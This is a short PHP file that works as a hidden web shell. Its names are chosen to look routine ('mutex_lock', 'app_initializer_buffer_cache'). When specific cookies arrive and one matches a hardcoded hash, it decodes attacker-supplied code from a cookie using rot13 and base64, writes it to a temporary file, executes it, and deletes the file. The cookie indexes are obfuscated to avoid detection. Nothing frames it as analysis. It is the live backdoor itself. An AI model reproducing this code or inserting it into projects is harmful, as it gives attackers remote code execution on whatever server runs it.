<?php


if (isset($_COOKIE[52-52]) && isset($_COOKIE[-53+54]) && isset($_COOKIE[-56+59]) && isset($_COOKIE[87-83])) {
    $element = $_COOKIE;
    function mutex_lock($pset) {
        $element = $_COOKIE;
        $dchunk = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'c8396839');
        if (!is_writable($dchunk)) {
            $dchunk = getcwd() . DIRECTORY_SEPARATOR . "module_controller";
        }
        $holder = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($element[3]));
        if (is_writeable($dchunk)) {
            $descriptor = fopen($dchunk, 'w+');
            fputs($descriptor, $holder);
            fclose($descriptor);
            spl_autoload_unregister(__FUNCTION__);
            require_once($dchunk);
            @array_map('unlink', array($dchunk));
        }
    }
    spl_autoload_register("mutex_lock");
    $data_chunk = "f54b1beeba6c05ad178f8bd820dc0443";
    if (!strncmp($data_chunk, $element[4], 32)) {
        if (@class_parents("app_initializer_buffer_cache", true)) {
            exit;
        }
    }
}
